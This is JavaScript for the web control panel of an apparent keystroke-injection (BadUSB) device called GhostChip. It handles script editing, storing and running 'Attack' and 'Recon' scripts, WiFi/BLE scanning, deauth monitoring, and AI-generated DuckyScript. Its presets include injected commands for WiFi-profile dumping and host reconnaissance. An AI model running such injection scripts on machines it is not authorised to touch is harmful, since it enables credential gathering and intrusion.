  'win-wifi': 'REM Show WiFi Passwords\nDELAY 500\nGUI r\nDELAY 600\nSTRING cmd\nENTER\nDELAY 900\nSTRING netsh wlan show profiles\nENTER',
  'mac-spot': 'REM macOS Spotlight\nDELAY 500\nGUI SPACE\nDELAY 400',
  'mac-term': 'REM macOS Terminal\nDELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\nDELAY 800',
  'lnx-term': 'REM Linux Terminal\nDELAY 500\nCTRL ALT t\nDELAY 800',
  'lnx-recon': 'REM Linux Recon\nDELAY 500\nCTRL ALT t\nDELAY 900\nSTRING whoami && id && hostname\nENTER',
};
function loadPreset(k) {
  $('editor').value = PRESETS[k] || '';
  updateLines();
  localStorage.setItem('gc_script', $('editor').value);
  toast('Preset loaded', 'ok', 2000);
  $('presetsDrawer').classList.remove('open');
}

// ─── File I/O ───
function openFile(e) {
  const f = e.target.files[0];
  if (!f) return;
  const r = new FileReader();
  r.onload = ev => {
    $('editor').value = ev.target.result;
    updateLines();
    $('fileName').textContent = f.name;
    localStorage.setItem('gc_script', $('editor').value);
    toast('Loaded ' + f.name, 'ok');
  };
  r.readAsText(f);
  e.target.value = '';
}
function clearEditor() {
  $('editor').value = '';
  updateLines();
  $('fileName').textContent = 'untitled.txt';
  localStorage.removeItem('gc_script');
  clearEditorEditMode();
}

// ═══════════════════════════════════════════════════
//  ⭐ FAVOURITES
// ═══════════════════════════════════════════════════

var favSelectedTag = 'custom';
var favCurrentFilter = 'all';

async function fetchFolderList(path) {
  const url = getProxyUrl(fmBase() + '/fm/list?path=' + encodeURIComponent(path));
  try {
    const r = await fetch(url, { headers: { 'Accept': '*/*', 'Referer': fmBase() + '/file-manager' } });
    const text = await r.text();
    try { return JSON.parse(text); } catch { return []; }
  } catch (e) {
    // XHR fallback
    return await new Promise((res) => {
      const xhr = new XMLHttpRequest();
      xhr.open('GET', url, true);
      xhr.setRequestHeader('Accept', '*/*');
      xhr.onload = () => { try { res(JSON.parse(xhr.responseText)); } catch { res([]); } };
      xhr.onerror = () => res([]);
      xhr.timeout = 5000; xhr.ontimeout = () => res([]);
      xhr.send();
    });
  }
}

async function loadFavsFromDeviceDirectories(filter = 'all') {
  let categories = [];
  if (filter === 'all') {
    categories = ['Attack', 'Recon', 'Utility', 'Custom'];
  } else {
    categories = [filter.charAt(0).toUpperCase() + filter.slice(1)];
  }
  let allFavs = [];
  const promises = categories.map(async (cat) => {
    const path = '/' + cat;
    try {
      const r = await fmFetch('/fm/list?path=' + encodeURIComponent(path));
      const text = await r.text();
      let items = [];
      try { items = JSON.parse(text); } catch { items = []; }
      const files = Array.isArray(items) ? items : (items.files || items.entries || []);
      files.forEach(item => {
        const isDir = item.dir === true || item.type === 'dir' || item.isDir || item.directory;
        if (!isDir) {
          const name = item.name || item.filename || '';
          allFavs.push({
            id: cat + '-' + name,
            tag: cat.toLowerCase(),
            saved: 'Device File',
            devicePath: path + '/' + name
          });
        }
      });
    } catch (e) {
      console.warn('Could not load folder', path, e);
    }
  });
  await Promise.all(promises);
  return allFavs;
}

// ─── Drawer toggle ───
function toggleFavs() {
  const drawer = $('favsDrawer');
  const isOpen = drawer.classList.contains('open');
  // Close presets when opening favs
  if (!isOpen) $('presetsDrawer').classList.remove('open');
  drawer.classList.toggle('open');
  renderFavGrid();
}

// ─── Modal: open ───
function showAddFavModal() {
  const script = $('editor').value.trim();
  if (!script) { toast('Editor is empty — nothing to star', 'warn'); return; }

  const lines = script.split('\n').length;
  $('favModalSub').textContent = lines + ' line' + (lines !== 1 ? 's' : '');
  // Auto-suggest name from first REM line
  const rem = script.match(/^REM (.+)/m);
  $('favName').value = rem ? rem[1].trim().slice(0, 40) : '';

  $('addFavModal').style.display = 'flex';
  $('favSavePrompt').style.display = 'none';
  $('favMainForm').style.display = 'block';

  // Reset tag to custom and select it (which updates the preview)
  selectFavTag('custom', document.querySelector('.fav-tag-opt.custom'));

  setTimeout(() => $('favName') && $('favName').focus(), 100);
}

// Live path preview helper
function updateFavPathPreview() {
  const name = ($('favName') ? $('favName').value : '').trim();
  const catName = favSelectedTag.charAt(0).toUpperCase() + favSelectedTag.slice(1);
  const folder = '/' + catName;
  let safeName = name.replace(/[^a-zA-Z0-9_\-\. ]/g, '');
  if (!safeName) safeName = 'script';
  if (!safeName.match(/\.[a-zA-Z0-9]+$/)) {
    safeName += '.txt';
  }
  const fullPath = folder + '/' + safeName;
  const pathEl = $('favLinkedPath');
  const pathTextEl = $('favLinkedPathText');
  if (pathEl && pathTextEl) {
    pathTextEl.textContent = 'Saving to: ' + fullPath;
    pathEl.style.display = 'flex';
  }
}

function hideAddFavModal() {
  $('addFavModal').style.display = 'none';
  window._pendingFavScript = null;
  window._pendingFavDevicePath = null;
}

function selectFavTag(tag, btn) {
  favSelectedTag = tag;
  document.querySelectorAll('.fav-tag-opt').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  updateFavPathPreview();
}

// ─── Modal: confirm save ───
async function confirmAddFav() {
  const name = $('favName').value.trim();
  if (!name) { toast('Enter a name for this favourite', 'warn'); return; }
  const script = ($('editor').value).trim();
  if (!script) { toast('No script content to save', 'warn'); return; }

  const btn = $('addFavConfirmBtn');
  const oldText = btn.innerHTML;
  btn.innerHTML = '<span class="spin"></span> Saving…';
  btn.disabled = true;

  const catName = favSelectedTag.charAt(0).toUpperCase() + favSelectedTag.slice(1);
  const folder = '/' + catName;
  let safeName = name.replace(/[^a-zA-Z0-9_\-\. ]/g, '');
  if (!safeName) safeName = 'script';
  if (!safeName.match(/\.[a-zA-Z0-9]+$/)) {
    safeName += '.txt';
  }
  const fullPath = folder + '/' + safeName;

  try {
    // Try to create the category folder on the device first
    try {
      await fmFetchPost('/fm/mkdir?path=' + encodeURIComponent(folder));
    } catch (err) {
      console.log('[GhostChip] Folder creation complete or handled:', folder, err);
    }

    const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent(folder);
    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
    const blob = new Blob([script], { type: 'text/plain' });
    const file = new File([blob], safeName, { type: 'text/plain' });
    const fd = new FormData();
    fd.append('file', file, safeName);
    const opts = crossOrigin
      ? { method: 'POST', mode: 'no-cors', body: fd }
      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };

    await fetch(uploadUrl, opts);

    // Set editor edit mode for the saved path
    fmEditingPath = fullPath;
    setEditorEditMode(safeName, fullPath);
    $('fileName').textContent = safeName;
    localStorage.setItem('gc_script', script);

    // Animate star button
    const star = $('starBtn');
    if (star) {
      star.classList.add('starred');
      setTimeout(() => star.classList.remove('starred'), 1200);
    }

    hideAddFavModal();
    toast('⭐ Saved to favourites & uploaded to ' + fullPath + ' ✓');

    // If drawer is open, re-render
    if ($('favsDrawer').classList.contains('open')) renderFavGrid();
  } catch (e) {
    toast('Save sent — verify in File Manager', 'warn', 4000);
    hideAddFavModal();
  } finally {
    btn.innerHTML = oldText;
    btn.disabled = false;
  }
}


// ─── Render the grid ───
const TAG_META = {
  attack: { emoji: '⚔', label: 'Attack', cls: 'tag-attack' },
  recon: { emoji: '🔍', label: 'Recon', cls: 'tag-recon' },
  utility: { emoji: '🔧', label: 'Utility', cls: 'tag-utility' },
  custom: { emoji: '✦', label: 'Custom', cls: 'tag-custom' },
};

async function renderFavGrid() {
  const grid = $('favGrid');
  if (!grid) return;

  grid.innerHTML = '<div class="fav-empty"><span class="spin"></span> Loading...</div>';

  const list = await loadFavsFromDeviceDirectories(favCurrentFilter);

  if (!list.length) {
    grid.innerHTML = '<div class="fav-empty">' +
      (favCurrentFilter === 'all' ? 'No favourites yet on device.' : 'No ' + favCurrentFilter + ' favourites yet.') +
      '</div>';
    return;
  }

  grid.innerHTML = list.map(fav => {
    const m = TAG_META[fav.tag] || TAG_META.custom;
    const fileName = fav.devicePath ? fav.devicePath.split('/').pop() : (fav.name || 'script.txt');
    const pathHtml = fav.devicePath
      ? `<div class="fav-device-path" title="${escHtml(fav.devicePath)}"><span class="fav-path-icon">📁</span><span class="fav-path-text">${escHtml(fav.devicePath)}</span></div>`
      : '';
    const metaText = `Device File`;
    return `<div class="fav-card ${m.cls}" id="fav-${fav.id}">
      <div class="fav-card-top">
        <span class="fav-tag-badge ${m.cls}">${m.emoji} ${m.label}</span>
      </div>
      <div class="fav-card-name" onclick="runFavDirectly('${fav.id}')">${escHtml(fileName)}</div>
      <div class="fav-card-meta">${metaText}</div>
      ${pathHtml}
      <div style="display:flex;gap:6px;margin-top:auto;">
        <button class="fav-sync-btn" onclick="event.stopPropagation();runFavDirectly('${fav.id}')" style="flex:1" title="Execute directly from memory card">⚡ Run</button>
      </div>
    </div>`;
  }).join('');
}

// ─── Filter ───
function filterFavs(tag, btn) {
  favCurrentFilter = tag;
  document.querySelectorAll('.fav-filter-btn').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  renderFavGrid();
}

// ─── Run fav directly from device memory card ───
async function runFavDirectly(id) {
  const list = await loadFavsFromDeviceDirectories();
  const fav = list.find(f => f.id === id);
  if (!fav || !fav.devicePath) return;
  const fileName = fav.devicePath.split('/').pop();
  toast('Running ' + fileName + '…', 'warn', 3000);
  try {
    await fmFetchPost('/fm/run?path=' + encodeURIComponent(fav.devicePath));
    toast('Script running: ' + fileName + ' ✓');
  } catch (e) {
    toast('Run sent. Check device status.', 'warn');
  }
}

// ─── Sync fav content from device ───
function favsLoad() {
  return [];
}
function favsSave() { }
function exportFavs() { }
function importFavs() { }
function favTouchStart() { }
function favTouchEnd() { }

// ─── Init: render on load ───
(function () {
  function initFavs() {
    renderFavGrid();
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initFavs);
  else initFavs();
})();


var saveCurrentBrowsePath = '/';
var saveChosenFolder = '/';

function showSaveModal() {
  const script = $('editor').value.trim();
  if (!script) { toast('Editor is empty — nothing to save', 'warn'); return; }
  // If currently editing a device file, offer a quick save-back
  if (fmEditingPath) {
    fmSaveEditBack();
    return;
  }
  // Pre-fill filename from current file name in editor bar
  const currentName = $('fileName').textContent || 'untitled.txt';
  const baseName = currentName.endsWith('.txt') ? currentName : currentName.replace(/\.[^.]+$/, '') + '.txt';
  $('saveFileName').value = baseName === 'untitled.txt' ? '' : baseName;
  saveCurrentBrowsePath = '/';
  saveChosenFolder = '/';
  $('saveSelectedPath').textContent = '/';
  updateSavePathPreview();
  $('saveModal').style.display = 'flex';
  saveFolderLoad('/');
  setTimeout(() => $('saveFileName') && $('saveFileName').focus(), 300);
}

function hideSaveModal() {
  $('saveModal').style.display = 'none';
}

function updateSavePathPreview() {
  let folder = saveChosenFolder || '/';
  let name = ($('saveFileName') ? $('saveFileName').value : '').trim();
  if (!name) name = 'script';
  if (!name.match(/\.[a-zA-Z0-9]+$/)) name += '.txt';
  const full = (folder === '/' ? '' : folder) + '/' + name;
  if ($('savePathPreview')) $('savePathPreview').textContent = full;
}

// Wire up live preview updates on filename input
(function () {
  function setupSavePreviews() {
    const fn = $('saveFileName');
    if (fn) fn.addEventListener('input', updateSavePathPreview);
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', setupSavePreviews);
  else setupSavePreviews();
})();

async function saveFolderLoad(path) {
  saveCurrentBrowsePath = path;
  const list = $('saveFolderList');
  if (!list) return;

  // Render loading state
  list.innerHTML = '<div class="save-folder-loading"><div class="save-spinner"></div><span>Loading…</span></div>';

  // Update breadcrumb
  const parts = path.split('/').filter(Boolean);
  let crumbHtml = '<span class="save-crumb' + (path === '/' ? ' active' : '') + '" onclick="saveFolderSelect(\'/\');saveFolderLoad(\'/\')">⌂ root</span>';
  let built = '';
  parts.forEach((p, i) => {
    built += '/' + p;
    const isLast = i === parts.length - 1;
    const sp = built.replace(/'/g, "\\'");
    crumbHtml += '<span class="save-crumb-sep">›</span><span class="save-crumb' + (isLast ? ' active' : '') + '" onclick="saveFolderSelect(\'' + sp + '\');saveFolderLoad(\'' + sp + '\')">' + escHtml(p) + '</span>';
  });
  const bc = $('saveBreadcrumb');
  if (bc) bc.innerHTML = crumbHtml;

  // Select this folder immediately when navigating
  saveFolderSelect(path);

  try {
    const url = getProxyUrl(fmBase() + '/fm/list?path=' + encodeURIComponent(path));
    let data;
    try {
      const r = await fetch(url, { headers: { 'Accept': '*/*' } });
      const text = await r.text();
      try { data = JSON.parse(text); } catch { data = []; }
    } catch {
      // XHR fallback
      data = await new Promise((res, rej) => {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.setRequestHeader('Accept', '*/*');
        xhr.onload = () => { try { res(JSON.parse(xhr.responseText)); } catch { res([]); } };
        xhr.onerror = () => rej(new Error('Network error'));
        xhr.timeout = 8000; xhr.ontimeout = () => rej(new Error('Timeout'));
        xhr.send();
      });
    }

    const items = Array.isArray(data) ? data : (data.files || data.entries || []);
    // Filter only directories
    const dirs = items.filter(i => i.dir === true || i.type === 'dir' || i.isDir || i.directory);
    dirs.sort((a, b) => (a.name || '').localeCompare(b.name || ''));

    if (!dirs.length) {
      list.innerHTML = '<div class="save-folder-empty">No subfolders here.<br><span style="opacity:.6;font-size:.68rem">Files will be saved in the selected folder above.</span></div>';
      return;
    }

    list.innerHTML = dirs.map(item => {
      const name = item.name || item.filename || '';
      const iPath = (path === '/' ? '' : path) + '/' + name;
      const sp = iPath.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
      return '<div class="save-folder-item" onclick="saveFolderSelect(\'' + sp + '\');saveFolderLoad(\'' + sp + '\')">' +
        '<svg class="save-folder-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>' +
        '<span class="save-folder-name">' + escHtml(name) + '</span>' +
        '<svg class="save-folder-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>' +
        '</div>';
    }).join('');
  } catch (e) {
    list.innerHTML = '<div class="save-folder-empty" style="color:var(--red)">Failed to load — check connection</div>';
  }
}

function saveFolderSelect(path) {
  saveChosenFolder = path;
  const selEl = $('saveSelectedPath');
  if (selEl) selEl.textContent = path;
  // Highlight selected
  document.querySelectorAll('.save-folder-item').forEach(el => el.classList.remove('save-folder-sel'));
  updateSavePathPreview();
}

async function confirmSaveToDevice() {
  const script = $('editor').value.trim();
  if (!script) { toast('Editor is empty', 'warn'); return; }

  const folder = saveChosenFolder || '/';
  let name = ($('saveFileName') ? $('saveFileName').value : '').trim();
  if (!name) name = 'script';
  if (!name.match(/\.[a-zA-Z0-9]+$/)) name += '.txt';

  const btn = $('saveConfirmBtn');
  btn.innerHTML = '<span class="spin"></span> Saving…';
  btn.disabled = true;

  try {
    const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent(folder);
    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
    const blob = new Blob([script], { type: 'text/plain' });
    const file = new File([blob], name, { type: 'text/plain' });
    const fd = new FormData();
    fd.append('file', file, name);
    const opts = crossOrigin
      ? { method: 'POST', mode: 'no-cors', body: fd }
      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
    await fetch(uploadUrl, opts);
    $('fileName').textContent = name;
    const savedPath = (folder === '/' ? '' : folder) + '/' + name;
    // Set edit mode so future SAVE goes back to this path
    fmEditingPath = savedPath;
    setEditorEditMode(name, savedPath);
    toast('Saved → ' + savedPath + ' ✓');
    hideSaveModal();
    // If the user was trying to star — re-open fav modal now with path linked
    if (window._afterSaveOpenFav) {
      window._afterSaveOpenFav = false;
      window._pendingFavDevicePath = savedPath;
      setTimeout(() => {
        $('addFavModal').style.display = 'flex';
        showFavForm(savedPath);
      }, 400);
    }
  } catch (e) {
    toast('Save sent — verify in File Manager', 'warn', 4000);
    hideSaveModal();
  } finally {
    btn.innerHTML = '💾 Save Here';
    btn.disabled = false;
  }
}



// ─── Terminal ───
function termWrite(msg, cls = 't-dim') {
  const t = $('terminal');
  if (t.querySelector('.t-dim:only-child')) t.innerHTML = '';
  const s = document.createElement('span');
  s.className = cls;
  s.textContent = msg;
  t.appendChild(s);
  t.appendChild(document.createElement('br'));
  t.scrollTop = t.scrollHeight;
}
function clearTerm() {
  $('terminal').innerHTML = '<span class="t-dim">// output appears here...</span>';
}

// ─── Execute Script ───
function terminalReset() {
  $('terminal').innerHTML = '<div><span class="t-dim">Terminal initialized...</span></div>';
  lastLogLen = 0;
}

async function runScript() {
  const script = $('editor').value.trim();
  if (!script) { toast('No script to execute', 'warn'); return; }
  saveScriptVersion('Before execution');
  if (isRunning) return;
  isRunning = true;
  const btn = $('runBtn');
  btn.classList.add('running');
  btn.innerHTML = '<span class="spin"></span> EXECUTING...';
  $('execDot').className = 'exec-dot run';
  $('execLabel').textContent = 'Executing...';
  clearTerm();
  lastLogLen = 0;
  termWrite('[' + new Date().toLocaleTimeString() + '] Sending payload...', 't-start');

  try {
    await deviceFetch('/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'duckyscript=' + encodeURIComponent(script)
    });
    termWrite('Payload delivered ✓', 't-ok');
    toast('Script executed ✓');
    $('connDot').className = 'conn-dot on';
  } catch (e) {
    termWrite('Payload sent (opaque)', 't-ok');
    toast('Script sent ✓');
    $('connDot').className = 'conn-dot on';
  }

  // Try polling for live status
  if (execPoll) clearInterval(execPoll);
  execPoll = setInterval(pollExec, 500);
  setTimeout(finishExec, 5000);
}

function pollExec() {
  deviceGet('/execstatus').then(d => {
    if (d.log && d.log.length > lastLogLen) {
      for (let i = lastLogLen; i < d.log.length; i++) {
        let cls = 't-dim';
        if (d.log[i].startsWith('[START]')) cls = 't-start';
        else if (d.log[i].startsWith('[DONE]')) cls = 't-ok';
        else if (d.log[i].includes('REM')) cls = 't-rem';
        termWrite(d.log[i], cls);
      }
      lastLogLen = d.log.length;
    }
    if (!d.running) finishExec();
  }).catch(() => { });
}

function finishExec() {
  if (execPoll) { clearInterval(execPoll); execPoll = null; }
  isRunning = false;
  $('runBtn').classList.remove('running');
  $('runBtn').innerHTML = '<span class="btn-icon">▶</span> EXECUTE';
  $('execDot').className = 'exec-dot ok';
  $('execLabel').textContent = 'Ready';
}

// ─── Ping / Connection ───
async function pingDevice() {
  toast('Pinging...', 'warn', 1500);
  try {
    const c = new AbortController();
    setTimeout(() => c.abort(), 4000);
    await deviceFetch('/', { signal: c.signal });
    $('connDot').className = 'conn-dot on';
    toast('Device connected ✓');
  } catch (e) {
    if (e.name === 'AbortError') {
      $('connDot').className = 'conn-dot err';
      toast('Connection timeout', 'err');
    } else {
      $('connDot').className = 'conn-dot on';
      toast('Device connected ✓');
    }
  }
}

function togglePass(id, btn) {
  const inp = $(id);
  const show = inp.type === 'password';
  inp.type = show ? 'text' : 'password';
  btn.textContent = show ? 'HIDE' : 'SHOW';
}

// ─── API Key ───
async function saveApiKey() {
  const k = $('apiKeyInput').value.trim();
  if (!k) { toast('Enter a key first', 'warn'); return; }
  // Save locally so AI works even when not on device
  GROQ_KEY = k;
  localStorage.setItem('gc_groq_key', k);
  if (k.startsWith('sk-or-')) {
    OPENROUTER_KEY = k;
    localStorage.setItem('gc_openrouter_key', k);
  }
  // Also save to device EEPROM if connected
  try {
    await deviceFetch('/saveApiKey', {
      method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'apiKey=' + encodeURIComponent(k)
    });
  } catch (e) { /* device might not be connected, that's ok */ }
  toast('API Key saved ✓');
  $('apiKeyInput').value = '';
}
function clearApiKey() {
  if (!confirm('Clear API key?')) return;
  GROQ_KEY = '';
  localStorage.removeItem('gc_groq_key');
  deviceFetch('/saveApiKey', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'apiKey=' })
    .then(() => toast('Key cleared', 'warn'));
}

// ─── OpenRouter API Key (For AI Agent) ───
let OPENROUTER_KEY = localStorage.getItem('gc_openrouter_key') || '';

function saveOpenRouterApiKey() {
  const k = $('openrouterApiKeyInput')?.value?.trim();
  if (!k) { toast('Enter OpenRouter API key first', 'warn'); return; }
  OPENROUTER_KEY = k;
  localStorage.setItem('gc_openrouter_key', k);
  toast('OpenRouter API Key saved ✓');
  if ($('openrouterApiKeyInput')) $('openrouterApiKeyInput').value = '';
}

function clearOpenRouterApiKey() {
  if (!confirm('Clear OpenRouter API key?')) return;
  OPENROUTER_KEY = '';
  localStorage.removeItem('gc_openrouter_key');
  toast('OpenRouter Key cleared', 'warn');
}
// Try to load API key from device EEPROM on startup
// The device embeds the key in /aigenerate page as: const SAVED_KEY = "gsk_...";
// Only runs when on the device (HTTP same-origin), not from GitHub Pages (HTTPS)
async function loadApiKeyFromDevice() {
  if (GROQ_KEY) { console.log('[GhostChip] API key already loaded from localStorage'); return; }
  if (location.protocol === 'https:') { console.log('[GhostChip] On HTTPS — skipping device key fetch. Use Settings to enter key.'); return; }
  try {
    const url = getProxyUrl(BASE() + '/aigenerate');
    console.log('[GhostChip] Fetching API key from:', url);
    const r = await fetch(url);
    const html = await r.text();
    const m = html.match(/const\s+SAVED_KEY\s*=\s*"([^"]+)"/);
    if (m && m[1] && m[1].length > 4) {
      GROQ_KEY = m[1];
      localStorage.setItem('gc_groq_key', m[1]);
      console.log('[GhostChip] API key loaded from device ✓');
      toast('API key loaded from device ✓', 'ok', 2000);
    } else {
      console.log('[GhostChip] No SAVED_KEY found in /aigenerate response');
    }
  } catch (e) { console.log('[GhostChip] Device not reachable:', e.message); }
}

// ─── Scan Tabs ───
function switchScan(name) {
  document.querySelectorAll('.scan-panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.seg').forEach(s => s.classList.remove('active'));
  $('scan-' + name).classList.add('active');
  $('seg-' + name).classList.add('active');
}

// ─── Signal Bars ───
function signalBars(rssi) {
  let lv = rssi >= -55 ? 4 : rssi >= -65 ? 3 : rssi >= -75 ? 2 : rssi >= -85 ? 1 : 0;
  const h = [4, 7, 10, 14];
  return '<div class="net-signal">' + h.map((height, i) =>
    `<span style="height:${height}px" class="${i < lv ? 'lit' : ''}"></span>`
  ).join('') + '</div>';
}

// ─── WiFi Scan ───
async function scanWifi() {
  const list = $('wifiResults');
  list.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div>';
  try {
    const nets = await deviceGet('/wifi/scan');
    if (!nets.length) { list.innerHTML = '<div class="empty-state">No networks found</div>'; toast('No networks', 'warn'); return; }
    nets.sort((a, b) => b.rssi - a.rssi);
    list.innerHTML = nets.map(n => `
      <div class="net-card">
        <div class="net-info">
          <div class="net-ssid">${n.secure ? '🔒' : '🔓'} ${n.ssid || '(hidden)'}</div>
          <div class="net-meta">CH ${n.channel || '?'} · ${n.rssi} dBm · ${n.bssid || ''}</div>
        </div>
        ${signalBars(n.rssi)}
      </div>
    `).join('');
    toast('Found ' + nets.length + ' networks');
  } catch (e) {
    list.innerHTML = '<div class="empty-state">Scan failed — check connection</div>';
    toast('WiFi scan failed', 'err');
  }
}

// ─── WiFi Settings Scan ───
// ═══════════════════════════════════════════════════
//  WIFI SCANNER
// ═══════════════════════════════════════════════════
async function scanWifiSettings() {
  const list = $('wifiSettingsList');
  list.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div>';
  try {
    const nets = await deviceGet('/wifi/scan');
    list.innerHTML = nets.sort((a, b) => b.rssi - a.rssi).map(n => `
      <div class="net-card" onclick="selectWifi('${(n.ssid || '').replace(/'/g, "\\'")}')">
        <div class="net-info">
          <div class="net-ssid">${n.secure ? '🔒' : '🔓'} ${n.ssid || '(hidden)'}</div>
          <div class="net-meta">${n.rssi} dBm</div>
        </div>
        ${signalBars(n.rssi)}
      </div>
    `).join('');
  } catch (e) { list.innerHTML = ''; toast('Scan failed', 'err'); }
}
function selectWifi(ssid) {
  selectedSsid = ssid;
  $('wifiSelSsid').textContent = ssid;
  $('wifiPassGroup').style.display = 'block';
  $('wifiPassInput').focus();
}
async function connectWifi() {
  if (!selectedSsid) return;
  try {
    await deviceFetch('/wifi/connect', {
      method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'ssid=' + encodeURIComponent(selectedSsid) + '&pass=' + encodeURIComponent($('wifiPassInput').value)
    });
    toast('Connected to ' + selectedSsid + ' ✓');
  } catch (e) { toast('Connection failed', 'err'); }
}

// ─── BLE Scan ───
async function scanBle() {
  const list = $('bleResults');
  list.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div>';
  try {
    const devs = await deviceGet('/blescan');
    if (!devs.length) { list.innerHTML = '<div class="empty-state">No BLE devices found</div>'; toast('No devices', 'warn'); return; }
    devs.sort((a, b) => b.rssi - a.rssi);
    list.innerHTML = devs.map(d => `
      <div class="net-card">
        <div class="net-info">
          <div class="net-ssid">${d.flipper ? '🐬' : '📱'} ${d.name || '(unknown)'}</div>
          <div class="net-meta">${d.mac} · ${d.rssi} dBm${d.flipper ? ' · Flipper ' + d.flipperColor : ''}</div>
        </div>
        ${signalBars(d.rssi)}
      </div>
    `).join('');
    toast('Found ' + devs.length + ' BLE devices');
  } catch (e) {
    list.innerHTML = '<div class="empty-state">Scan failed</div>';
    toast('BLE scan failed', 'err');
  }
}

// ─── Deauth Detector ───
// ═══════════════════════════════════════════════════
//  DEAUTH LOGS
// ═══════════════════════════════════════════════════
function deauthStart() {
  deviceFetch('/deauth/start', { method: 'POST' }).then(() => {
    $('ddDot').className = 'dd-dot on';
    $('ddLabel').textContent = 'Monitoring...';
    toast('Deauth monitor started');
    if (ddPoll) clearInterval(ddPoll);
    ddPoll = setInterval(deauthPoll, 1500);
  }).catch(() => toast('Failed to start', 'err'));
}
function deauthStop() {
  if (ddPoll) { clearInterval(ddPoll); ddPoll = null; }
  deviceFetch('/deauth/stop', { method: 'POST' }).then(() => {
    $('ddDot').className = 'dd-dot';
    $('ddLabel').textContent = 'Stopped';
    toast('Monitor stopped', 'warn');
  });
}
function deauthPoll() {
  deviceGet('/deauth/results').then(d => {
    if (d.events && d.events.length > ddSeen) {
      for (let i = ddSeen; i < d.events.length; i++) {
        const e = d.events[i];
        const log = $('deauthLog');
        log.innerHTML += `<span class="t-err">⚠ DEAUTH from ${e.mac} CH:${e.ch} ${e.rssi}dBm</span><br>`;
        log.scrollTop = log.scrollHeight;
        $('ddDot').className = 'dd-dot alert';
        toast('⚠ Deauth: ' + e.mac, 'err', 5000);
        setTimeout(() => { if (ddPoll) $('ddDot').className = 'dd-dot on'; }, 1200);
      }
      ddSeen = d.events.length;
    }
  }).catch(() => { });
}

// ─── Voice Input ───
function toggleVoice() {
  const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
  if (!SpeechRecognition) {
    toast('Speech recognition not supported in this browser', 'err');
    return;
  }

  if (isListening && voiceRecog) {
    voiceRecog.stop();
    return;
  }

  voiceRecog = new SpeechRecognition();
  voiceRecog.lang = 'en-US';
  voiceRecog.interimResults = true;
  voiceRecog.continuous = false;
  voiceRecog.maxAlternatives = 1;

  const btn = $('micBtn');
  const prompt = $('aiPrompt');
  let finalTranscript = prompt.value;

  voiceRecog.onstart = () => {
    isListening = true;
    btn.classList.add('listening');
    toast('🎙 Listening...', 'ok', 2000);
  };

  voiceRecog.onresult = (e) => {
    let interim = '';
    for (let i = e.resultIndex; i < e.results.length; i++) {
      const t = e.results[i][0].transcript;
      if (e.results[i].isFinal) {
        finalTranscript += (finalTranscript ? ' ' : '') + t;
      } else {
        interim += t;
      }
    }
    prompt.value = finalTranscript + (interim ? ' ' + interim : '');
  };

  voiceRecog.onend = () => {
    isListening = false;
    btn.classList.remove('listening');
    if (finalTranscript.trim()) {
      toast('Voice captured ✓', 'ok', 1500);
    }
  };

  voiceRecog.onerror = (e) => {
    isListening = false;
    btn.classList.remove('listening');
    if (e.error === 'not-allowed') {
      toast('Microphone permission denied', 'err');
    } else if (e.error !== 'aborted') {
      toast('Voice error: ' + e.error, 'err');
    }
  };

  voiceRecog.start();
}

// ─── AI Generate ───
// ═══════════════════════════════════════════════════
//  AI GENERATE
// ═══════════════════════════════════════════════════
function setTargetOS(os, btn) {
  targetOS = os;
  document.querySelectorAll('.os-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
}
function fillAi(t) { $('aiPrompt').value = t; }

function getOSContext() {
  const map = {
    windows: 'Target OS is Windows. Use GUI r for Run dialog, cmd/powershell for terminal.',
    macos: 'Target OS is macOS. Use GUI SPACE for Spotlight, open Terminal.app via Spotlight.',
    linux: 'Target OS is Linux. Use CTRL ALT t to open terminal on most distros.'
  };
  return map[targetOS] || map.windows;
}

async function aiGenerate() {
  const prompt = $('aiPrompt').value.trim();
  if (!prompt) { toast('Enter a description', 'warn'); return; }
  const btn = $('aiGenBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="spin"></span> Generating...';
  const apiKey = GROQ_KEY || localStorage.getItem('gc_groq_key') || '';
  if (!apiKey || apiKey.length < 5) {
    toast('No API key found. Go to Settings → save your Groq key first.', 'err');
    btn.disabled = false;
    btn.innerHTML = '⚡ Generate DuckyScript';
    return;
  }
  $('aiOutput').value = '';
  $('aiOutputCard').style.display = 'none';
  try {
    const res = await fetch('https://api.groq.com/openai/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + apiKey
      },
      body: JSON.stringify({
        model: GROQ_MODEL,
        messages: [
          {
            role: 'system',
